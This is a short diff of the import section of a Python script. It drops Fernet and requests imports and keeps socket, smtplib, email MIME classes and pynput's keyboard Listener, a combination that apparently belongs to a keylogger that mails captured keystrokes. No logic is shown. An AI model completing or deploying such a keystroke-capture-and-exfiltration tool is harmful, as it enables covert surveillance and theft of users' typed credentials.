@@ -4,14 +4,12 @@ import sys;
 import socket;
 import smtplib;
 import multiprocessing;
-from cryptography.fernet import Fernet;
 from email.mime.text import MIMEText;
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email import encoders
 from typing import *;
 from pynput.keyboard import Listener, Key
-from requests import get;
 
 HOMEPATH: str = ""
 FILEPATH: str = ""
